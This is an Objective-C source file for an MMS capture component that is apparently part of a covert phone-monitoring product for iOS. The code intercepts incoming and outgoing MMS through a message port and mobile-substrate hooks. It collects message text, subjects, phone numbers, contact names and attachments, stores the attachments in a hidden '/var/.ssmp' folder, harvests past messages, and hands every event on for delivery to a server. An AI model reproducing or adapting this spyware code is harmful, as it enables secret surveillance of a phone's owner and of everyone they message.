/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  MMSCaptureManager
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  31/1/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "MMSCaptureManager.h"
#import "MMSNotifier.h"

#import "FxLogger.h"
#import "FxEventEnums.h"
#import "FxMmsEvent.h"
#import "FxAttachment.h"
#import "FxRecipient.h"
#import "DateTimeFormat.h"
#import "ABContactsManager.h"
#import "DaemonPrivateHome.h"
#import "FxRecipient.h"
#import "DefStd.h"
#import "MMSCaptureUtils.h"

#import "MMSCaptureDAO.h"
#import "HistoricalEventQueueUtils.h"

#import <UIKit/UIKit.h>

@interface MMSCaptureManager (PrivateAPI) 
- (BOOL) checkIfRecipientEmail: (NSString *) aRecipientAddress;
- (NSString *) getMMSAttachmentPath;
- (void) removeMMS: (NSString *) aPath;
- (BOOL) writeMMSData:(id ) aMMSDataOrPath 
		  andFilePath: (NSString *) aFilePath;

- (void) contactWithMMSEvent: (FxMmsEvent *) aMMSEvent;
- (void) mmsEventDidFinish: (FxMmsEvent *) aMMSEvent;
- (void) mmsEventsDidFinish: (NSArray *) aMMSEvents;
- (void) flashMmsEvents;
@end

@implementation MMSCaptureManager

@synthesize mMMSAttachmentPath;
@synthesize mTelephonyNotificationManager;

/**
 - Method name: initWithEventDelegate
 - Purpose:This method is used to initialize the MMSCaptureManager class
 - Argument list and description: aEventDelegate (EventDelegate)
 - Return description: No return type
*/

- (id) initWithEventDelegate:(id <EventDelegate>) aEventDelegate {
	if ((self = [super init])) {
		mEventDelegate	= aEventDelegate;
		mMMSEventPool	= [[NSMutableArray alloc] init];
		mMMSUtils		= [[MMSCaptureUtils alloc] init];
	}
	return self;
}

/**
 - Method name: startCapture
 - Purpose:This method is used to start MMS Capturing
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) startCapture {
	if (!mMessagePortIPCReader) {
		mMessagePortIPCReader = [[MessagePortIPCReader alloc] initWithPortName:kMMSMessagePort
													withMessagePortIPCDelegate:self];
		[mMessagePortIPCReader start];
	}
	
	NSInteger systemOS = [[[UIDevice currentDevice] systemVersion] intValue];
	if (systemOS >= 6 && !mMMSNotifier) {
		mMMSNotifier = [[MMSNotifier alloc] initWithTelephonyNotificationManager:mTelephonyNotificationManager];
		[mMMSNotifier setMDelegate:self];
		// Capture using telephony notification callback (can use for both but now use for incoming only)
		[mMMSNotifier setMEventsSelector:@selector(mmsEventsDidFinish:)];
		// Capture using mobile substrate (outgoing only)
		[mMMSNotifier setMEventSelector:@selector(mmsEventDidFinish:)];
		[mMMSNotifier setMMMSAttachmentPath:mMMSAttachmentPath];
		[mMMSNotifier start];
	}
    
    DLog (@"Start Capturing MMS...")
}

/**
 - Method name:stopMonitoring
 - Purpose: This method is used for stop operation for receiving mms
 - Argument list and description: No argument
 - Return type and description: No Return
*/

- (void) stopCapture{
	if (mMessagePortIPCReader) {
		[mMessagePortIPCReader stop];
		[mMessagePortIPCReader release];
		mMessagePortIPCReader = nil;
	}

	NSInteger systemOS = [[[UIDevice currentDevice] systemVersion] intValue];
	if (systemOS >= 6 && mMMSNotifier) {
        [mMMSNotifier prepareForRelease];
		[mMMSNotifier release];
		mMMSNotifier = nil;
	}

	DLog (@"Stop capturing MMS...");
}

/**
 - Method name:dataDidReceivedFromMessagePort
 - Purpose: This method is invoked when receiving MMS Contents.
 - Argument list and description: aRawData (NSData *)
 - Return type and description: No Return
*/

- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
	DLog (@"Captured MMS Message ...");
	NSString *mmsPath=[[NSString alloc]initWithData:aRawData encoding:NSUTF8StringEncoding];
	NSData *datafile=[NSData dataWithContentsOfFile:mmsPath];
	NSKeyedUnarchiver *unarchiver = [[NSKeyedUnarchiver alloc] initForReadingWithData:datafile];
	NSDictionary *dictionary = [[unarchiver decodeObjectForKey:kMessageMonitorKey] retain];
    [unarchiver finishDecoding];
	
	FxMmsEvent *mmsEvent= [[FxMmsEvent alloc] init];
	[mmsEvent setDateTime:[DateTimeFormat phoenixDateTime]];
	[mmsEvent setEventType:kEventTypeMms];
	ABContactsManager *contactManager=[[ABContactsManager alloc]init]; 
	
	//============ MMS Subject =========================================
	NSString *mmsSubject=[dictionary objectForKey:kMessageSubjectKey];
	[mmsEvent setSubject:mmsSubject];
	
	//============ MMS Message =========================================
	NSString *mmsMessage = [dictionary objectForKey:kMMSTextKey];
	[mmsEvent setMessage:mmsMessage];
	
	//============ MMS Type ============================================
	NSString *mmsType= [dictionary objectForKey:kMMSTypeKey];
	
	//=============Conversation ID =====================================
	[mmsEvent setMConversationID:[dictionary objectForKey:kMMSGroupIDKey]];
	
	
	//============ Outgoing MMS ========================================
	if ([mmsType isEqualToString:kMMSOutgoing]) {
		[mmsEvent setDirection:kEventDirectionOut];	// Set mms event direction as out
		NSArray *recipients=[dictionary objectForKey:kMMSRecipients];
		for (NSString *recipientItem in recipients) {
			FxRecipient *recipient=[[FxRecipient alloc] init];
			[recipient setRecipType:kFxRecipientTO];
			if (![self checkIfRecipientEmail:recipientItem]) { // Check whether the recipient address is email or not
				//Set recipient adress as phone number
				recipientItem=[recipientItem stringByReplacingOccurrencesOfString:@"-" withString:@""];
				[recipient setRecipNumAddr:[contactManager formatSenderNumber:recipientItem]];
				//[recipient setRecipContactName:[contactManager searchContactName:recipientItem]];
				[recipient setRecipContactName:[contactManager searchFirstNameLastName:recipientItem]];
			}
			else {
				// Set recipient Address as email
				[recipient setRecipNumAddr:recipientItem];
				//[recipient setRecipContactName:[contactManager searchContactNameWithEmail:recipientItem]];
				
				/*
				[recipient setRecipContactName:[contactManager searchFirstLastNameWithEmail:recipientItem]];
				 
				 ISSUE:
				 This cause the issue of wrong contact name like "Som Som" in the case that 
				 -  have more than identical email in the same contact
				 -  more than one contact with the identical email							 
				 */
				[recipient setRecipContactName:[contactManager searchDistinctFirstLastNameWithEmail:recipientItem]];
			}
			[mmsEvent addRecipient:recipient];
			[recipient release];
		}
	}
	else {
		//============ Incoming MMS =========================================
		NSArray *senderInfo=[dictionary objectForKey:kMMSRecipients];
		if ([senderInfo count]>0) {
			NSString * senderNumber=[[senderInfo objectAtIndex:0] stringByReplacingOccurrencesOfString:@"-" withString:@""];
		    [mmsEvent setDirection:kEventDirectionIn]; // set 
		    [mmsEvent setSenderNumber:[contactManager formatSenderNumber:senderNumber]];
		    //[mmsEvent setSenderContactName:[contactManager searchContactName:senderNumber]];
			[mmsEvent setSenderContactName:[contactManager searchFirstNameLastName:senderNumber]];
		}
	}
	
	//============ MMS Attachment ==============================================================
	NSArray *mmsAttachments=[dictionary objectForKey:kMMSAttachments];
	NSString *path=[self getMMSAttachmentPath];
	//============ MMS Subject =================================================================
	for (NSDictionary *item in mmsAttachments) {
		FxAttachment *attachment=[[FxAttachment alloc]init];
		NSData *attachmentData=[item objectForKey:kMMSAttachmenInfoKey];
		NSString *attachmentFileName=[item objectForKey:kMMSFileNameKey];
		NSString *attachmentPath=[NSString stringWithFormat:@"%@mmsatt_%lf_%@",path,[[NSDate date] timeIntervalSince1970],attachmentFileName];
		//DLog(@"attachmentData = %@, attachmentFileName = %@, attachmentPath = %@", attachmentData, attachmentFileName, attachmentPath);
		if([self writeMMSData:attachmentData andFilePath:attachmentPath]) {
			[attachment setFullPath:attachmentPath];
			[mmsEvent addAttachment:attachment];
		}
		[attachment release];
	}
	
	//=============================SEND MMS EVENT==============================================
	if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
		
		if ([[mmsEvent mConversationID] isEqualToString:@""]						&&		// conversation id = 0
			[[[UIDevice currentDevice] systemVersion] intValue] == 5				&&		// ios 5
			[[dictionary objectForKey:kMMSTypeKey] isEqualToString:kMMSIncomming]	) {		// incoming direction
			[mMMSUtils queryConversationIdAndDeliverMMSEvent:mmsEvent
												senderNumber:[mmsEvent senderNumber]
										   messageDateString:[dictionary objectForKey:kMMSDateStringKey]
													 delgate:mEventDelegate];
		} else {					
			[mEventDelegate performSelector:@selector(eventFinished:) withObject:mmsEvent withObject:self];
			DLog (@"Send MMS event to the server")
		}

	}
	//============================Print=========================================
	DLog (@"=======>MMS Subject             : %@",mmsSubject);
	DLog (@"=======>MMS Type                : %@",mmsType);
	DLog (@"=======>MMS manipulate message  : %@", [mmsEvent message]);
	DLog (@"=======>MMS conversation id     : %@",[mmsEvent mConversationID]);
	DLog (@"=======>Sender Number           : %@",[mmsEvent senderNumber]);
	DLog (@"=======>Sender Name             : %@",[mmsEvent senderContactName]);
	
    for (FxRecipient *aRecipient in [mmsEvent recipientArray]) {
		DLog (@"=======>Recipient Number    : %@",[aRecipient recipNumAddr]);
		DLog (@"=======>Recipient Name      : %@",[aRecipient recipContactName]);
	}
    
	DLog (@"Attachment Info...")
	for (FxAttachment *aAttachment in  [mmsEvent attachmentArray]) {
		DLog (@"=======>Attachment Path     : %@",[aAttachment fullPath]);
	}
	//==========================================================================
	[self removeMMS:mmsPath];
	[mmsEvent release];
	[contactManager release];
    [dictionary release];
	[unarchiver release];
	
}

/**
 - Method name: writeMMSData
 - Purpose:This method is used to write MMS attachment data into the ssmp app folder
 - Argument list and description: aMMSData(NSData *),aFilePath(NSString *)
 - Return description:isSuccess(BOOL)
*/


- (BOOL) writeMMSData:(id ) aMMSDataOrPath 
		  andFilePath: (NSString *) aFilePath {
	DLog (@"Save MMS attachment aMMSDataOrPath = %@, aFilePath = %@", aMMSDataOrPath, aFilePath);
	NSFileManager *fm = [NSFileManager defaultManager];
	NSError *error;
	BOOL isSuccess=NO;
	if ([aMMSDataOrPath isKindOfClass:[NSData class]]) {
		isSuccess=[fm createFileAtPath:aFilePath contents:aMMSDataOrPath attributes:nil];
	}
    else {
	    isSuccess=[fm copyItemAtPath:aMMSDataOrPath toPath:aFilePath error:&error];
	}
	DLog (@"Save MMS attachment, isSuccess = %d", isSuccess);
	return isSuccess;
}

/**
 - Method name: getMMSAttachmentPath
 - Purpose:This method is used to get the common path for attachment
 - Argument list and description: No Argument
 - Return description: orginalPath (NSString)
 */

- (NSString *) getMMSAttachmentPath { // /var/.ssmp/attachments/mms/
	return [self mMMSAttachmentPath];
}

/**
 - Method name: checkIfRecipientEmail
 - Purpose:This method is used to check whether the recipient address is email or not
 - Argument list and description: aRecipientAddress (NSString *)
 - Return description:(BOOL)
*/

- (BOOL) checkIfRecipientEmail: (NSString *) aRecipientAddress {
	if ([aRecipientAddress rangeOfString:@"@"].location == NSNotFound)
		return NO;
	else 
	    return YES;
}

/**
 - Method name:removeMMS
 - Purpose: This method is used to remove MMS .
 - Argument list and description: aPath (NSString *)
 - Return type and description: No Return
 */


- (void) removeMMS: (NSString *) aPath {
	NSFileManager *fileManager=[NSFileManager defaultManager];
	NSError *error=nil;
	if ([fileManager removeItemAtPath:aPath error:&error]) {
		DLog (@"Removed MMS message");
	}
	else {
		DLog (@"Error occured while removing mail message")
	}
}

#pragma mark -
#pragma mark IOS6
#pragma mark -

- (void) contactWithMMSEvent: (FxMmsEvent *) aMMSEvent {
	ABContactsManager *contactManager=[[ABContactsManager alloc] init];
	if ([aMMSEvent direction] == kEventDirectionIn) {
		DLog (@"Incoming mms");
        DLog(@"##########################################################################")
        DLog(@"                         INCOMING MMS iOS 6,7,8,9")
        DLog(@"##########################################################################")
		NSString *senderNumber = [aMMSEvent senderNumber];
		senderNumber = [senderNumber stringByReplacingOccurrencesOfString:@"-" withString:@""];
		//NSString *contactName = [contactManager searchFirstNameLastName:senderNumber];
        NSString *contactName = [contactManager searchFirstNameLastName:senderNumber contactID:-1];
		[aMMSEvent setSenderContactName:contactName];
	} else if ([aMMSEvent direction] == kEventDirectionOut) {
		DLog (@"Outgoing mms");
        DLog(@"##########################################################################")
        DLog(@"                         OUTGOING MMS iOS 6,7,8,9")
        DLog(@"##########################################################################")
		for (FxRecipient *recipient in [aMMSEvent recipientArray]) {
			NSString *recipientNumber = [recipient recipNumAddr];
			recipientNumber = [recipientNumber stringByReplacingOccurrencesOfString:@"-" withString:@""];
			NSString *contactName = nil;
			if (![self checkIfRecipientEmail:recipientNumber]) { // Check if recipient of this MMS is an email address
				//contactName = [contactManager searchFirstNameLastName:recipientNumber];
                contactName = [contactManager searchFirstNameLastName:recipientNumber contactID:-1];
			} else {

				/*
				contactName = [contactManager searchFirstLastNameWithEmail:recipientNumber];
				 
				 ISSUE:
				 This cause the issue of wrong contact name like "Som Som" in the case that 
				 -  have more than identical email in the same contact
				 -  more than one contact with the identical email							 
				 */
				//contactName = [contactManager searchDistinctFirstLastNameWithEmail:recipientNumber];
                contactName = [contactManager searchDistinctFirstLastNameWithEmailV2:recipientNumber];
			}
			DLog (@"Contact name of %@ is %@", recipientNumber, contactName);
			[recipient setRecipContactName:contactName];
		}
	}
	[contactManager release];
}

- (void) mmsEventDidFinish: (FxMmsEvent *) aMMSEvent {
	// Find out the contact name
	[self contactWithMMSEvent:aMMSEvent];
	// Deliver event to server -------------------
	if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
		[mEventDelegate performSelector:@selector(eventFinished:) withObject:aMMSEvent withObject:self];
	}
}

- (void) mmsEventsDidFinish: (NSArray *) aMMSEvents {
	// Find out the contact name
	for (FxMmsEvent *mmsEvent in aMMSEvents) {
		[self contactWithMMSEvent:mmsEvent];
		[mMMSEventPool addObject:mmsEvent];
	}
	
	// To fix outgoing mms to multiple recipients
	[NSObject cancelPreviousPerformRequestsWithTarget:self];
	[self performSelector:@selector(flashMmsEvents) withObject:nil afterDelay:3.5];
}

- (void) flashMmsEvents {
	DLog (@"Grouping mms & flashing");
	// Grouping the mms events group by ROWID in sms.db (to fix outgoing mms to multiple recipients)
	NSMutableDictionary *mmsGroups = [[NSMutableDictionary alloc] init];
	for (FxMmsEvent *mmsEvent in mMMSEventPool) {
		NSNumber *groupID = [NSNumber numberWithUnsignedInteger:[mmsEvent eventId]];
		NSMutableArray *group = [mmsGroups objectForKey:groupID];
		if (!group) {
			group = [[NSMutableArray alloc] initWithObjects:mmsEvent, nil];
			[mmsGroups setObject:group forKey:groupID];
			[group release];
		} else {
			[group addObject:mmsEvent];
		}
	}
	[mMMSEventPool removeAllObjects];
	
	NSArray *group = nil;
	
	// Method 1
//	NSEnumerator *enumerator = [mmsGroups objectEnumerator];
//	while (group = [enumerator nextObject]) {
	
	// Method 2
	NSMutableArray *allKeys = [[NSMutableArray alloc] initWithArray:[mmsGroups allKeys]];
	[allKeys sortUsingSelector:@selector(compare:)];
	DLog (@"allKeys in mmsGroups = %@", allKeys);
	NSEnumerator *enumerator = [allKeys objectEnumerator];
	NSNumber *key = nil;
	while (key = [enumerator nextObject]) {
		DLog (@"key of group = %@", key);
		group = [mmsGroups objectForKey:key];
		
		NSInteger index = 0;
		for (FxMmsEvent *mmsEvent in group) {
			if ([mmsEvent direction] == kEventDirectionOut && [group count] > 1) {
				// Unlike sms; mms get only one notification when user sent mms to multiple recipients
				FxRecipient *recipient = [[mmsEvent recipientArray] objectAtIndex:index];
				NSMutableArray *recipients = [[NSMutableArray alloc] initWithObjects:recipient, nil];
				[mmsEvent setRecipientArray:recipients];
				[recipients release];
				index++;
			}
			
			DLog (@"*****************************************************************");
			DLog (@"ROWID       = %lu", (unsigned long)[mmsEvent eventId]);
			DLog (@"time        = %@", [mmsEvent dateTime]);
			DLog (@"sender      = %@", [mmsEvent senderNumber]);
			DLog (@"name        = %@", [mmsEvent senderContactName]);
			DLog (@"text        = %@", [mmsEvent message]);
			DLog (@"subject     = %@", [mmsEvent subject]);
			DLog (@"recipients  = %@", [mmsEvent recipientArray]);
			DLog (@"attachments = %@", [mmsEvent attachmentArray]);
			DLog (@"direction   = %d", [mmsEvent direction]);
			DLog (@"*****************************************************************");
			
			// Deliver event to server -------------------
			if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
				[mEventDelegate performSelector:@selector(eventFinished:) withObject:mmsEvent withObject:self];
			}
		}
	}
	[allKeys release];
	[mmsGroups release];
}

- (void) prepareForRelease {
	[NSObject cancelPreviousPerformRequestsWithTarget:self];
	[NSObject cancelPreviousPerformRequestsWithTarget:mMMSUtils];
}

#pragma mark - Historical MMS


/* 
    This path should be the same as the path assigned in AppEngine
 */

+ (NSString *) getHistoricalMMSAttachmentPath {
    NSString* mmsAttachmentPath         = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/mms/"];
    [DaemonPrivateHome createDirectoryAndIntermediateDirectories:mmsAttachmentPath];
    return mmsAttachmentPath;
}

+ (MMSCaptureDAO *) constructMMSCaptureDaoForHistoricalEvent {
    NSString *mmsAttachmentPath             = [self getHistoricalMMSAttachmentPath];
    DLog(@"mmsAttachmentPath %@", mmsAttachmentPath)
    HistoricalEventQueueUtils *queueUtils   = [HistoricalEventQueueUtils sharedHistoricalEventQueueUtils];
    
    // - Create DAO and assign the attachment path and queue
    MMSCaptureDAO *mmsCaptureDAO            = [[MMSCaptureDAO alloc] init];
    [mmsCaptureDAO setMAttachmentPath:mmsAttachmentPath];
    [mmsCaptureDAO setMAttSavingQueue:[queueUtils mQueue]];
    return [mmsCaptureDAO autorelease];
}


#pragma mark - Historical MMS (Public Method)


+ (NSArray *) allMMSs {
    NSArray *mmsLogs = [NSArray array];
    @try {
        MMSCaptureDAO *mmsCaptureDAO        = [[self constructMMSCaptureDaoForHistoricalEvent] retain];
        mmsLogs                             = [mmsCaptureDAO selectAllMMSHistory];
        [mmsCaptureDAO release];
    }
    @catch (NSException *exception) {
        DLog(@"NS exception = %@", exception);
    }
    @catch (...) {
        DLog(@"Unknown exception");
    }
    @finally {
        ;
    }
    return mmsLogs;
}

+ (NSArray *) allMMSsWithMax: (NSInteger) aMaxNumber {
    NSArray *mmsLogs = [NSArray array];
    @try {
        MMSCaptureDAO *mmsCaptureDAO        = [[self constructMMSCaptureDaoForHistoricalEvent] retain];
        mmsLogs                             = [mmsCaptureDAO selectAllMMSHistoryWithMax:aMaxNumber];
        [mmsCaptureDAO release];
    }
    @catch (NSException *exception) {
        DLog(@"NS exception = %@", exception);
    }
    @catch (...) {
        DLog(@"Unknown exception");
    }
    @finally {
        ;
    }
    
    return mmsLogs;
}

/**
 - Method name:dealloc
 - Purpose: This is memory mangement method. Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
*/

- (void) dealloc {
	[mMMSEventPool release];
	[mMMSAttachmentPath release];
	[mMMSUtils release];
	[self stopCapture];
    [super dealloc];
}

@end
